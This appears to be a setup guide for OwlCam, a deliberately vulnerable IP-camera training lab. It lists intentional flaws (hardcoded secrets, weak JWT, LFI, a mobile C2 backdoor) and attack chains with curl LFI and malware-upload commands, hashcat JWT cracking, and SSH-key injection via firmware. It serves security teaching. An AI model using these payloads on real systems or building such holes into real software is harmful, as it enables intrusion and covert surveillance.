# OwlCam - IP Camera Surveillance Lab (Layer 2)

**Stage Purpose**: Deploy a vulnerable IP camera surveillance ecosystem including OpenWRT-based camera, Dockerized backend API, and mobile application for comprehensive IoT security training.

## Scenario

A video surveillance camera has been installed in a home environment, but the company is taking too long to configure access. While waiting, the system exposes multiple vulnerabilities allowing security researchers to investigate video surveillance system security.

## Architecture

```
┌─────────────────┐     HTTP      ┌──────────────────┐     SSE      ┌──────────────┐
│  OpenWRT Camera │◄─────────────►│   Cloud API      │◄───────────►│ Mobile App   │
│  (Raspberry Pi) │   RTSP :8554  │   (Docker)       │   :5000      │  (Android)   │
└─────────────────┘               └──────────────────┘              └──────────────┘
         │                                │
         │ HTTP :80                       │ HTTP :5000
         ▼                                ▼
┌─────────────────┐               ┌──────────────────┐
│  Camera Web UI  │               │  API Endpoints   │
│  (Device Mgmt)  │               │  /cameras, /api  │
└─────────────────┘               └──────────────────┘
```

## Inputs

| Layer | Source Path | Role/Description |
|-------|-------------|------------------|
| **Layer 3** | `../../docs/OwlCam/README.md` | Lab introduction and setup guide |
| **Layer 3** | `../../docs/OwlCam/API/Vulnerabilities.md` | API vulnerabilities (OWASP API Top 10 2023) |
| **Layer 3** | `../../docs/OwlCam/IoT (Camera)/Vulnerabilities.md` | IoT vulnerabilities (OWASP IoT Top 10 2018) |
| **Layer 3** | `../../docs/OwlCam/Mobile/Vulnerabilities.md` | Mobile vulnerabilities (OWASP MASVS) |
| **Layer 3** | `../../docs/OwlCam/Mobile/ARCHITECTURE_SSE_C2.md` | C2 backdoor architecture |
| **Layer 4** | `files/` | OpenWRT overlay files for camera |
| **Layer 4** | `../../cloud_api/` | Docker containers for backend API |
| **Layer 4** | `../../vulnzoo_apps/` | Mobile application source (Kotlin/Compose) |

## Process

### 1. Analyze Deployment Requirements

**Components:**
| Component | Type | Technology | Network |
|-----------|------|------------|---------|
| Camera Device | Physical/Virtual | OpenWRT on Raspberry Pi | 192.168.2.1 |
| Backend API | Docker | Python/Flask + MongoDB | localhost:5000 |
| Mobile App | Android | Kotlin/Compose | 10.0.2.2 (emulator) |

**Test Credentials:**
| Username | Password | Role | Notes |
|----------|----------|------|-------|
| john | doe123 | Standard user | Camera registered but unverified |
| admin | (JWT crackable) | Administrator | Via JWT exploitation |

### 2. Apply Vulnerability Configuration

**IoT1:2018 - Weak/Guessable/Hardcoded Passwords:**
- Camera model: Aviosys 9060ASL
- Default credentials: `admin:12345678`
- SSH hash crackable with hashcat (mode 7400)
- Firmware update script contains hardcoded signature key

**IoT2:2018 - Insecure Network Services:**
- Video streaming via HTTP/RTSP without TLS
- Plain text transmission of video streams
- Credentials transmitted in clear text
- No stream authentication enforcement

**IoT4:2018 - Insecure Update Mechanism:**
```bash
# /etc/init.d/update-firmware hardcoded values:
SECRET="k3yVulnC4m"
FIRMWARE_SIGNATURE='FIRMWARE_SIGNATURE: VulnZoo-2025-SECURE'
openssl enc -aes-256-cbc -k 'supersecret'
```

### 3. Transform (Deployment Steps)

**Step 1: Deploy OpenWRT Camera:**
```bash
# Flash OpenWRT image to Raspberry Pi
# Configure network: 192.168.2.1
# Install camera services:
opkg install kmod-video-core ffmpeg
# Configure RTSP stream on port 8554
```

**Step 2: Start Backend API:**
```bash
cd ../../cloud_api
docker-compose up -d --build
# API available at http://localhost:5000
# Initialize database:
curl http://localhost:5000/camerasdb/init
```

**Step 3: Configure API Vulnerabilities:**

| Vulnerability | Configuration |
|---------------|---------------|
| API1:2023 BOLA | `/api/v1/userinfo?id=` - no auth check on v1 |
| API2:2023 Broken Auth | JWT secret: `supersecretkey`, session bypass via session_id |
| API3:2023 BOPLA | Mass assignment on password change, admin_session cookie exposure |
| API5:2023 BFLA | Referer-based auth: `Referer: /admin` bypasses checks |
| API7:2023 SSRF | `/admin/assign-role` no CSRF token |
| API8:2023 Misconfiguration | `/register` exposes user enumeration, no rate limiting |
| API9:2023 Inventory | `/api/status` LFI via `?feature=....//etc/passwd` |
| API10:2023 Unsafe Consumption | `/messages` trusts client-supplied sender field |

**Step 4: Deploy Mobile App:**
```bash
cd ../../vulnzoo_apps
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start -n com.example.vulnzooapp/.MainActivity
```

**Mobile Vulnerabilities (M6, M9):**
- M6: C2 backdoor via `/api/v2/diag/validate` with weak token (hex sum mod 7)
- M9: JWT stored in plaintext `/data/data/com.example.vulnzoo/shared_prefs/session_prefs.xml`

### 4. Refine

**Verification Steps:**
- [ ] Camera web interface loads at `http://192.168.2.1`
- [ ] RTSP stream accessible on port 8554
- [ ] API responds at `http://localhost:5000`
- [ ] Database initialized with default user `john`
- [ ] Mobile app connects to API (10.0.2.2 for emulator)

## Outputs

| Artifact | Path/Port | Description |
|----------|-----------|-------------|
| Camera Web UI | `192.168.2.1:80` | OpenWRT device management |
| RTSP Stream | `192.168.2.1:8554` | Unencrypted video stream |
| API Service | `:5000` | Flask backend |
| Admin Panel | `:5000/admin` | User/camera management |
| C2 Panel | `:5000/c2` | Backdoor management (via LFI) |
| MongoDB | `:27017` | User/camera data |
| Mobile App | Android | Kotlin/Compose surveillance app |

## Vulnerability Chains

### Chain 1: User Enumeration → JWT Crack → Admin Access
```
POST /register → Enumerate users (409 = exists)
  ↓
POST /support → Message admin, capture admin_id from /api/messages
  ↓
hashcat -m 16500 JWT → Crack "supersecretkey"
  ↓
Forge admin JWT → Access /admin panel
```

### Chain 2: LFI → C2 Credentials → Mobile Backdoor
```
GET /api/status?feature=....//etc/passwd → LFI confirmed
  ↓
GET /api/status?feature=....//vulnzoo/config/c2.conf → C2 credentials
  ↓
Access C2 panel → View backdoored devices
  ↓
Exfil JWT from mobile via C2 (M9: plaintext in SharedPreferences)
```

### Chain 3: Firmware Upload → RCE → SSH Key Injection
```
PUT /api/status?feature=....//vulnzoo/firmware/evil.bin → Upload malware
  ↓
Firmware contains: echo "ssh-rsa ..." >> /etc/dropbear/authorized_keys
  ↓
Victims update camera → Attacker gains SSH access
```

### Chain 4: Message Spoofing → Phishing → Credential Harvesting
```
Modify localStorage username → Send message as "admin"
  ↓
Victim receives message from "admin" with malicious link
  ↓
CSRF to /admin/assign-role or credential harvesting
```

## API Vulnerabilities (OWASP API Top 10 2023)

| ID | Vulnerability | Endpoint | Evidence |
|----|---------------|----------|----------|
| API1 | Broken Object Level Authorization | `/api/v1/userinfo?id=` | No auth check, user enumeration |
| API1 | BOLA (snapshot) | `/snapshot` | Admin/viewer bypass any camera |
| API2 | Broken Authentication | `/api/v2/login`, `/snapshot` | Weak JWT secret, session bypass |
| API2 | Insecure JWT | All endpoints | `supersecretkey` in SecLists |
| API3 | Broken Object Property Level Authorization | `/api/messages` | Exposes sender user_id |
| API3 | Mass Assignment | `/profile-change_password` | Can set admin_session cookie |
| API5 | Broken Function Level Authorization | `/admin/users/<id>` | Referer-based auth bypass |
| API7 | SSRF | `/admin/assign-role` | No CSRF token |
| API8 | Security Misconfiguration | `/register` | User enumeration, no rate limit |
| API8 | Info Disclosure | `/api/system/logs` | No auth, exposes admin activities |
| API9 | Improper Inventory Management | `/api/status` | LFI, PUT file upload |
| API10 | Unsafe Consumption of APIs | `/messages` | Trusts client sender field |

## IoT Vulnerabilities (OWASP IoT Top 10 2018)

| ID | Vulnerability | Evidence |
|----|---------------|----------|
| IoT1 | Weak Passwords | Default admin:12345678, crackable hash |
| IoT2 | Insecure Network Services | RTSP/HTTP without TLS, plain text credentials |
| IoT3 | Insecure Ecosystem Interfaces | API vulnerabilities allow stream access |
| IoT4 | Insecure Update Mechanism | Hardcoded signature, firmware RCE possible |

## Mobile Vulnerabilities (OWASP MASVS)

| ID | Vulnerability | Evidence |
|----|---------------|----------|
| M6 | Inadequate Privacy Controls | Hidden C2 backdoor `/api/v2/diag/validate` |
| M6 | Weak C2 Auth | Token = hex sum mod 7, trivial brute force |
| M6 | Covert Surveillance | shell, exfil, remote_view capabilities |
| M9 | Insecure Data Storage | JWT in plaintext SharedPreferences |

## Key Attack Vectors

### JWT Exploitation
```bash
# Crack JWT secret
hashcat -m 16500 JWT ./Passwords/scraped-JWT-secrets.txt --show

# Forge admin token with discovered admin_id
# Payload: {"user_id": "<admin_id>", "iat": ..., "exp": ...}
```

### LFI to RCE Chain
```bash
# Read /etc/passwd
curl "http://target:5000/api/status?feature=....//....//etc/passwd"

# Upload firmware malware
curl -X PUT --data-binary @malware \
  "http://target:5000/api/status?feature=....//vulnzoo/firmware/evil.bin"
```

### C2 Backdoor Access
```bash
# Discover C2 credentials via LFI
# Access C2 panel at /c2
# View capabilities: ['shell', 'exfil', 'remote_view', 'firmware_flash']
# Exfiltrate mobile JWT from SharedPreferences
```

## Dependencies

| Component | Requirement |
|-----------|-------------|
| Camera | Raspberry Pi 3B/4 with OpenWRT |
| Backend | Docker, Docker Compose |
| Mobile | Android Emulator (API 24+) or physical device |
| Network | 192.168.2.0/24 for camera, localhost for API |

## References

- Docs: `docs/OwlCam/README.md`
- API Vulns: `docs/OwlCam/API/Vulnerabilities.md`
- IoT Vulns: `docs/OwlCam/IoT (Camera)/Vulnerabilities.md`
- Mobile Vulns: `docs/OwlCam/Mobile/Vulnerabilities.md`
- C2 Architecture: `docs/OwlCam/Mobile/ARCHITECTURE_SSE_C2.md`
- OWASP API Top 10: 2023
- OWASP IoT Top 10: 2018
- OWASP MASVS: Mobile Application Security

## Testing Credentials

| Service | URL | Username | Password |
|---------|-----|----------|----------|
| Camera Web | http://192.168.2.1 | admin | 12345678 |
| API | http://localhost:5000 | john | doe123 |
| Admin Panel | http://localhost:5000/admin | (JWT forgery) | N/A |
| C2 Panel | http://localhost:5000/c2 | (LFI discovery) | (LFI discovery) |
